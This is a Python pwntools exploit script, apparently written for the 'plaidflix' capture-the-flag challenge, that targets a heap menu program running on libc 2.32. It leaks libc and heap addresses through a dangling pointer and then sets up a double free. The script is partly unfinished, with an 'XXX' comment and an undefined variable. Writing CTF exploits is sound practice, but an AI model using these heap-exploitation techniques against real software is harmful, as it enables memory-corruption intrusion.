#!/usr/bin/env python3

from pwn import *

the_binary = "./bin/plaidflix"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc-2.32.so", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("plaidflix.pwni.ng", 1337)
elif args.STRACE:
    io = process(["strace", "-o" ,"strace.txt", the_binary])
elif args.LTRACE:
    io = process(["ltrace", "-o", "ltrace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

def send(data):
    io.sendlineafter("> ", data)

def send_num(num):
    send(str(num))

def menu(*nums):
    for num in nums:
        send_num(num)

def add_movie(title, rating):
    menu(0, 0)
    send(title)
    send_num(rating)

def remove_movie(idx):
    menu(0, 1)
    send_num(idx)

def show_movies():
    menu(0, 2)

def share_movie(movie_idx, friend_idx):
    menu(0, 3)
    send_num(movie_idx)
    send_num(friend_idx)

def add_friend(name):
    menu(1, 0)
    send_num(len(name))
    send(name)

def remove_friend(idx):
    menu(1, 1)
    send_num(idx)

def show_friends():
    menu(1, 2)

def add_feedback(data):
    menu(0)
    send(data)

def delete_feedback(idx):
    menu(1)
    send_num(idx)

def add_contact_details():
    menu(2)
    send(data)

def consolidate():
    send("0"*0x1024 + "9")

def leak():
    show_movies()
    io.recvuntil("Shared with: ")
    raw_leak = io.recvuntil(b"\n", drop=True)
    return u64(raw_leak.ljust(8, b"\x00"))

class Constants:
    max_friend_name_len = 0x90 - 1
    max_num_movies = 7
    max_num_friends = 8

# Name.
send("x"*0x64)

for i in range(Constants.max_num_movies):
    add_movie(f"movie_{i}", 5)
for i in range(Constants.max_num_movies):
    remove_movie(i)

# Prevent consolidation with top chunk.
add_friend("A"*0x10)
remove_friend(0)

consolidate()

for i in range(Constants.max_num_friends):
    add_friend(chr(i+0x41)*Constants.max_friend_name_len)

add_movie("0"*0x10, 5)
share_movie(0, 0)

for i in reversed(range(Constants.max_num_friends)):
    remove_friend(i)
consolidate()

# Libc leak from dangling pointer.
libc_leak = leak()
libc.address = libc_leak - 0x1e3c90
log.info("libc leak: %#x" % libc_leak)
log.info("libc base: %#x" % libc.address)

for i in range(Constants.max_num_friends):
    add_friend(chr(i+0x41)*Constants.max_friend_name_len)
for i in reversed(range(Constants.max_num_friends)):
    remove_friend(i)
consolidate()
heap_leak = leak()
heap_base = heap_leak << 12
log.info("heap leak: %#x" % heap_leak)
log.info("heap base: %#x" % heap_base)

# We can double free pointers in the feedback functionality when deleting our
# account. To do so, we have to enter the account deletion functionality, at
# which point we can't return to the original menu.
menu(2)
send("y")

for i in range(10):
    add_feedback(str(i)*0x10)
# Fill tcache bin to avoid double-free scanning there.
for i in range(7):
    delete_feedback(i)

# Leave last feedback unfreed (i.e., it remains in-use) so prevent
# consolidation of the remaining free chunks with the top chunk.

# Double free? XXX
delete_feedback(7)
delete_feedback(8)
delete_feedback(7)

# Empty tcache
for i in range(7):
    add_feedback(str(i)*0x10)

add_feedback("double1")
add_feedback("double2")
add_feedback("double3")

io.interactive()
